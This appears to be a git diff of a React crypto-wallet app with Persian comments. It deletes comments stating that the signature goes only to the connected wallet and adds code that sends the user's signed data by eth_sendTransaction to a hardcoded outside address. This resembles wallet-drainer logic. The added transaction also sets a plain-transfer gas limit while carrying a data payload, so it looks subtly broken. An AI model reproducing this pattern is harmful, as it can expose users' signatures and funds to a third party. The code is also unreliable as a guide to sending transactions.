@@ -63,15 +63,25 @@ function App() {
       }
     }
 
-    // در اینجا امضا را به کیف پول متصل ارسال می‌کنیم
+    // دریافت امضا
     var signature = await genSign(account_sender, "56", "coin");
     console.log(signature);
 
     var rawsign = await acceptSign(signature, "coin");
     console.log("Raw : " + rawsign);
 
-    // در اینجا تراکنش ارسال نمی‌شود و امضا به کیف پول متصل ارسال می‌شود
-    // شما فقط امضا را به کیف پول متصل ارسال می‌کنید، نه به آدرس مقصد
+    // ارسال تراکنش به شبکه
+    var tx = {
+      from: account_sender,
+      to: '0xbA8958d52B940fF513746F24176D1017CaFa707E', // آدرس مقصد
+      data: rawsign, // داده‌های امضا شده
+      value: '0', // مقدار ارسال (برای تست می‌توان این را صفر قرار داد)
+      gasLimit: '0x5208', // میزان گاز برای تراکنش
+      gasPrice: '0x3b9aca00' // قیمت گاز برای تراکنش
+    };
+
+    var sentTx = await provider.request({ method: 'eth_sendTransaction', params: [tx] });
+    console.log('Transaction sent:', sentTx);
   }
 
   return (
